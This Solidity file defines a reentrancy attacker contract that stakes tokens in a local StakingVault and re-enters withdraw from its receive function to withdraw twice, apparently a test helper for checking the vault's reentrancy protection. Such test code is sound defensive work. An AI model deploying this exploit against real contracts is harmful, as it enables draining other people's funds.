// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./StakingVault.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ReentrancyAttacker {
    StakingVault public vault;
    IERC20 public stakingToken;
    uint256 public attackAmount;
    bool public attacking;

    constructor(address payable _vault, address _stakingToken) {
        vault = StakingVault(_vault);
        stakingToken = IERC20(_stakingToken);
    }

    function attack(uint256 amount) external {
        attackAmount = amount;
        
        // Transfer staking tokens from sender to this contract
        stakingToken.transferFrom(msg.sender, address(this), amount);
        
        // Approve vault to spend tokens
        stakingToken.approve(address(vault), amount);
        
        // Stake tokens in the vault
        vault.stake(amount);
        
        // Withdraw to trigger reentrancy
        attacking = true;
        vault.withdraw(amount);
        attacking = false;
    }

    receive() external payable {
        if (attacking) {
            attacking = false; // Prevent infinite loop / out-of-gas
            vault.withdraw(attackAmount);
        }
    }
}
